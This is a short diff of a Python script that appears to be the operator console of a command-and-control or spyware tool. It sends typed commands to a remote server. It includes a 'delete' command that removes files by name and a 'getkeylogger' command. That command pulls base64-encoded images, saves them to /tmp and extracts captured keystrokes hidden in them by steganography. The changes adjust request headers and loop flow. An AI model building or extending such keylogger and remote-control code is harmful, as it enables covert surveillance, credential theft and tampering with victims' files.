@@ -40,15 +40,15 @@ while True:  # Establish connection with client
         continue
     if 'delete ' in message:
         filename = message.replace('delete ','').strip()
-        ret = requests.post(urljoin(baseurl, '/delete'), json={'filename': filename})
+        ret = requests.post(urljoin(baseurl, '/delete'), headers={'Content-type':'application/json'}, json={'filename':filename})
         print(ret.text)
     if 'getkeylogger' in message:
         data = requests.get(urljoin(baseurl, '/getkeylogger')).text
         with open('/tmp/tmpkeylogger.png','wb') as f:
             f.write(base64.b64decode(data))
         data = stegano_decrypt('/tmp/tmpkeylogger.png')
-        # print(data)
         print(data)
+        continue
     if " " not in message:
         print("please input the format of [command] [post_body], post body is optional but space is mandatory")
         continue
